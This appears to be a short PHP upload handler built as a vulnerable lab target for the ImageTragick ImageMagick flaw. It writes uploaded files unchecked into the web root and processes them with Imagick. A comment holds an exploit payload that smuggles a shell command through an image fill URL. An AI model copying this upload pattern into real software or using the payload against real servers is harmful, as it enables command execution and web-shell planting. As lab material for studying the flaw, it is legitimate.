<?php

  $target_dir = "/var/www/html/";
  $target_file = $target_dir . basename($_FILES["file"]["name"]);

  // Check if image file is a actual image or fake image
  if(isset($_POST["submit"])) {

    $target_dir = "/var/www/html/";
    $target_file = $target_dir . basename($_FILES["file"]["name"]);

    move_uploaded_file($_FILES["file"]["tmp_name"], $target_file);

   // Imagemagick stuff for exploiting
   // push graphic-context
   // viewbox 0 0 640 480
   // fill 'url(https://voidsec1.com/logo.png"|touch "/tmp/passwd)'
   // pop graphic-context

   $im = new Imagick(realpath($target_file));
   $im->setImageColorspace(255);
   $im->setCompression(Imagick::COMPRESSION_JPEG);
   $im->setCompressionQuality(60);
   $im->setImageFormat('jpeg'); 

   echo "The file ". basename( $_FILES["file"]["name"]). " has been uploaded.";
  }

?>
